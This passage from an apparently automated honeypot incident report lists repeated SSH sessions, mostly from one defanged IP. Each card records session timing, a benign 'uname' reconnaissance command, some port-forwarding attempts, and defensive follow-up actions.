| `2026-07-19 10:10:25` | `cowrie.command.input` |
| `2026-07-19 10:10:27` | `cowrie.log.closed` |
| `2026-07-19 10:10:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d04a1b19af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:10 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:10:20` | `cowrie.session.connect` |
| `2026-07-19 10:10:23` | `cowrie.client.version` |
| `2026-07-19 10:10:23` | `cowrie.client.kex` |
| `2026-07-19 10:10:32` | `cowrie.login.success` |
| `2026-07-19 10:10:38` | `cowrie.session.params` |
| `2026-07-19 10:10:38` | `cowrie.command.input` |
| `2026-07-19 10:10:39` | `cowrie.log.closed` |
| `2026-07-19 10:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5362d593c5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:10 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:10:32` | `cowrie.session.connect` |
| `2026-07-19 10:10:35` | `cowrie.client.version` |
| `2026-07-19 10:10:35` | `cowrie.client.kex` |
| `2026-07-19 10:10:41` | `cowrie.login.success` |
| `2026-07-19 10:10:45` | `cowrie.session.params` |
| `2026-07-19 10:10:45` | `cowrie.command.input` |
| `2026-07-19 10:10:46` | `cowrie.log.closed` |
| `2026-07-19 10:10:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ce63dd5af3b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:10 |
| **Last Seen** | 2026-07-19 10:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:10:48` | `cowrie.session.connect` |
| `2026-07-19 10:10:49` | `cowrie.client.version` |
| `2026-07-19 10:10:49` | `cowrie.client.kex` |
| `2026-07-19 10:10:53` | `cowrie.login.success` |
| `2026-07-19 10:10:57` | `cowrie.session.params` |
| `2026-07-19 10:10:57` | `cowrie.command.input` |
| `2026-07-19 10:10:58` | `cowrie.log.closed` |
| `2026-07-19 10:10:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7246243e5669

| Field | Detail |
|---|---|
| **Source IP** | `176.170.1[.]244` |
| **First Seen** | 2026-07-19 10:10 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:10:57` | `cowrie.session.connect` |
| `2026-07-19 10:10:59` | `cowrie.client.version` |
| `2026-07-19 10:10:59` | `cowrie.client.kex` |
| `2026-07-19 10:11:05` | `cowrie.login.success` |
| `2026-07-19 10:11:08` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:11:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.170.1[.]244` to AbuseIPDB if not already reported
- [ ] Block `176.170.1[.]244` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce570ebbfe61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:00` | `cowrie.session.connect` |
| `2026-07-19 10:11:01` | `cowrie.client.version` |
| `2026-07-19 10:11:01` | `cowrie.client.kex` |
| `2026-07-19 10:11:04` | `cowrie.login.success` |
| `2026-07-19 10:11:05` | `cowrie.session.params` |
| `2026-07-19 10:11:05` | `cowrie.command.input` |
| `2026-07-19 10:11:05` | `cowrie.log.closed` |
| `2026-07-19 10:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c1e683ff448

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:12` | `cowrie.session.connect` |
| `2026-07-19 10:11:14` | `cowrie.client.version` |
| `2026-07-19 10:11:14` | `cowrie.client.kex` |
| `2026-07-19 10:11:21` | `cowrie.login.success` |
| `2026-07-19 10:11:25` | `cowrie.session.params` |
| `2026-07-19 10:11:25` | `cowrie.command.input` |
| `2026-07-19 10:11:27` | `cowrie.log.closed` |
| `2026-07-19 10:11:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94147e242acb

| Field | Detail |
|---|---|
| **Source IP** | `220.78.179[.]108` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:14` | `cowrie.session.connect` |
| `2026-07-19 10:11:15` | `cowrie.client.version` |
| `2026-07-19 10:11:15` | `cowrie.client.kex` |
| `2026-07-19 10:11:17` | `cowrie.login.success` |
| `2026-07-19 10:11:18` | `cowrie.direct-tcpip.request` |
| `2026-07-19 10:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.78.179[.]108` to AbuseIPDB if not already reported
- [ ] Block `220.78.179[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b66ba22cbfe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:23` | `cowrie.session.connect` |
| `2026-07-19 10:11:25` | `cowrie.client.version` |
| `2026-07-19 10:11:25` | `cowrie.client.kex` |
| `2026-07-19 10:11:31` | `cowrie.login.success` |
| `2026-07-19 10:11:34` | `cowrie.session.params` |
| `2026-07-19 10:11:34` | `cowrie.command.input` |
| `2026-07-19 10:11:37` | `cowrie.log.closed` |
| `2026-07-19 10:11:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d4676f43213

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:39` | `cowrie.session.connect` |
| `2026-07-19 10:11:40` | `cowrie.client.version` |
| `2026-07-19 10:11:40` | `cowrie.client.kex` |
| `2026-07-19 10:11:48` | `cowrie.login.success` |
| `2026-07-19 10:11:53` | `cowrie.session.params` |
| `2026-07-19 10:11:53` | `cowrie.command.input` |
| `2026-07-19 10:11:56` | `cowrie.log.closed` |
| `2026-07-19 10:11:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-739056064b50

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:11 |
| **Last Seen** | 2026-07-19 10:12 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:11:49` | `cowrie.session.connect` |
| `2026-07-19 10:11:51` | `cowrie.client.version` |
| `2026-07-19 10:11:51` | `cowrie.client.kex` |
| `2026-07-19 10:12:00` | `cowrie.login.success` |
| `2026-07-19 10:12:09` | `cowrie.session.params` |
| `2026-07-19 10:12:09` | `cowrie.command.input` |
| `2026-07-19 10:12:11` | `cowrie.log.closed` |
| `2026-07-19 10:12:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0936f28767fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:12 |
| **Last Seen** | 2026-07-19 10:12 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:12:01` | `cowrie.session.connect` |
| `2026-07-19 10:12:03` | `cowrie.client.version` |
| `2026-07-19 10:12:03` | `cowrie.client.kex` |
| `2026-07-19 10:12:15` | `cowrie.login.success` |
| `2026-07-19 10:12:21` | `cowrie.session.params` |
| `2026-07-19 10:12:21` | `cowrie.command.input` |
| `2026-07-19 10:12:23` | `cowrie.log.closed` |
| `2026-07-19 10:12:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3622023bbacb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:12 |
| **Last Seen** | 2026-07-19 10:12 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:12:12` | `cowrie.session.connect` |
| `2026-07-19 10:12:15` | `cowrie.client.version` |
| `2026-07-19 10:12:15` | `cowrie.client.kex` |
| `2026-07-19 10:12:24` | `cowrie.login.success` |
| `2026-07-19 10:12:28` | `cowrie.session.params` |
| `2026-07-19 10:12:28` | `cowrie.command.input` |
| `2026-07-19 10:12:29` | `cowrie.log.closed` |
| `2026-07-19 10:12:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b90c80579e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:12 |
| **Last Seen** | 2026-07-19 10:12 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:12:29` | `cowrie.session.connect` |
| `2026-07-19 10:12:31` | `cowrie.client.version` |
| `2026-07-19 10:12:31` | `cowrie.client.kex` |
| `2026-07-19 10:12:40` | `cowrie.login.success` |
| `2026-07-19 10:12:43` | `cowrie.session.params` |
| `2026-07-19 10:12:43` | `cowrie.command.input` |
| `2026-07-19 10:12:45` | `cowrie.log.closed` |
| `2026-07-19 10:12:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52ae0ac2be4f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:12 |
| **Last Seen** | 2026-07-19 10:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:12:41` | `cowrie.session.connect` |
| `2026-07-19 10:12:42` | `cowrie.client.version` |
| `2026-07-19 10:12:42` | `cowrie.client.kex` |
| `2026-07-19 10:12:50` | `cowrie.login.success` |
| `2026-07-19 10:12:53` | `cowrie.session.params` |
| `2026-07-19 10:12:53` | `cowrie.command.input` |
| `2026-07-19 10:12:54` | `cowrie.log.closed` |
| `2026-07-19 10:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b428ccd93e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:12 |
| **Last Seen** | 2026-07-19 10:13 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:12:53` | `cowrie.session.connect` |
| `2026-07-19 10:12:54` | `cowrie.client.version` |
| `2026-07-19 10:12:54` | `cowrie.client.kex` |
| `2026-07-19 10:13:03` | `cowrie.login.success` |
| `2026-07-19 10:13:09` | `cowrie.session.params` |
| `2026-07-19 10:13:09` | `cowrie.command.input` |
| `2026-07-19 10:13:11` | `cowrie.log.closed` |
| `2026-07-19 10:13:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d0dc7b3ec7d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:13 |
| **Last Seen** | 2026-07-19 10:13 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:13:03` | `cowrie.session.connect` |
| `2026-07-19 10:13:05` | `cowrie.client.version` |
| `2026-07-19 10:13:05` | `cowrie.client.kex` |
| `2026-07-19 10:13:14` | `cowrie.login.success` |
| `2026-07-19 10:13:19` | `cowrie.session.params` |
| `2026-07-19 10:13:19` | `cowrie.command.input` |
| `2026-07-19 10:13:20` | `cowrie.log.closed` |
| `2026-07-19 10:13:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e281a86270

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:13 |
| **Last Seen** | 2026-07-19 10:13 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:13:16` | `cowrie.session.connect` |
| `2026-07-19 10:13:19` | `cowrie.client.version` |
| `2026-07-19 10:13:19` | `cowrie.client.kex` |
| `2026-07-19 10:13:25` | `cowrie.login.success` |
| `2026-07-19 10:13:31` | `cowrie.session.params` |
| `2026-07-19 10:13:31` | `cowrie.command.input` |
| `2026-07-19 10:13:33` | `cowrie.log.closed` |
| `2026-07-19 10:13:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f6bf7313031

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:13 |
| **Last Seen** | 2026-07-19 10:13 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:13:25` | `cowrie.session.connect` |
| `2026-07-19 10:13:29` | `cowrie.client.version` |
| `2026-07-19 10:13:29` | `cowrie.client.kex` |
| `2026-07-19 10:13:40` | `cowrie.login.success` |
| `2026-07-19 10:13:47` | `cowrie.session.params` |
| `2026-07-19 10:13:47` | `cowrie.command.input` |
| `2026-07-19 10:13:50` | `cowrie.log.closed` |
| `2026-07-19 10:13:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-171167188e38

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:13 |
| **Last Seen** | 2026-07-19 10:14 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:13:36` | `cowrie.session.connect` |
| `2026-07-19 10:13:40` | `cowrie.client.version` |
| `2026-07-19 10:13:40` | `cowrie.client.kex` |
| `2026-07-19 10:13:51` | `cowrie.login.success` |
| `2026-07-19 10:13:56` | `cowrie.session.params` |
| `2026-07-19 10:13:56` | `cowrie.command.input` |
| `2026-07-19 10:14:00` | `cowrie.log.closed` |
| `2026-07-19 10:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d4c1dc4c384

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:13 |
| **Last Seen** | 2026-07-19 10:14 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:13:54` | `cowrie.session.connect` |
| `2026-07-19 10:13:56` | `cowrie.client.version` |
| `2026-07-19 10:13:56` | `cowrie.client.kex` |
| `2026-07-19 10:14:07` | `cowrie.login.success` |
| `2026-07-19 10:14:13` | `cowrie.session.params` |
| `2026-07-19 10:14:13` | `cowrie.command.input` |
| `2026-07-19 10:14:17` | `cowrie.log.closed` |
| `2026-07-19 10:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65cacd83555d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:14 |
| **Last Seen** | 2026-07-19 10:14 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:14:05` | `cowrie.session.connect` |
| `2026-07-19 10:14:08` | `cowrie.client.version` |
| `2026-07-19 10:14:08` | `cowrie.client.kex` |
| `2026-07-19 10:14:19` | `cowrie.login.success` |
| `2026-07-19 10:14:23` | `cowrie.session.params` |
| `2026-07-19 10:14:23` | `cowrie.command.input` |
| `2026-07-19 10:14:25` | `cowrie.log.closed` |
| `2026-07-19 10:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99156121f304

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:14 |
| **Last Seen** | 2026-07-19 10:14 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:14:19` | `cowrie.session.connect` |
| `2026-07-19 10:14:21` | `cowrie.client.version` |
| `2026-07-19 10:14:21` | `cowrie.client.kex` |
| `2026-07-19 10:14:30` | `cowrie.login.success` |
| `2026-07-19 10:14:36` | `cowrie.session.params` |
| `2026-07-19 10:14:36` | `cowrie.command.input` |
| `2026-07-19 10:14:41` | `cowrie.log.closed` |
| `2026-07-19 10:14:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af165ca72520

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:14 |
| **Last Seen** | 2026-07-19 10:14 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:14:29` | `cowrie.session.connect` |
| `2026-07-19 10:14:31` | `cowrie.client.version` |
| `2026-07-19 10:14:31` | `cowrie.client.kex` |
| `2026-07-19 10:14:44` | `cowrie.login.success` |
| `2026-07-19 10:14:49` | `cowrie.session.params` |
| `2026-07-19 10:14:49` | `cowrie.command.input` |
| `2026-07-19 10:14:53` | `cowrie.log.closed` |
| `2026-07-19 10:14:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83d2c0417ac9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:14 |
| **Last Seen** | 2026-07-19 10:15 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:14:45` | `cowrie.session.connect` |
| `2026-07-19 10:14:47` | `cowrie.client.version` |
| `2026-07-19 10:14:47` | `cowrie.client.kex` |
| `2026-07-19 10:15:00` | `cowrie.login.success` |
| `2026-07-19 10:15:08` | `cowrie.session.params` |
| `2026-07-19 10:15:08` | `cowrie.command.input` |
| `2026-07-19 10:15:10` | `cowrie.log.closed` |
| `2026-07-19 10:15:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09a8782a90a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:14 |
| **Last Seen** | 2026-07-19 10:15 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:14:56` | `cowrie.session.connect` |
| `2026-07-19 10:15:00` | `cowrie.client.version` |
| `2026-07-19 10:15:00` | `cowrie.client.kex` |
| `2026-07-19 10:15:11` | `cowrie.login.success` |
| `2026-07-19 10:15:16` | `cowrie.session.params` |
| `2026-07-19 10:15:16` | `cowrie.command.input` |
| `2026-07-19 10:15:20` | `cowrie.log.closed` |
| `2026-07-19 10:15:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96732f9a81ba

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:15 |
| **Last Seen** | 2026-07-19 10:15 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
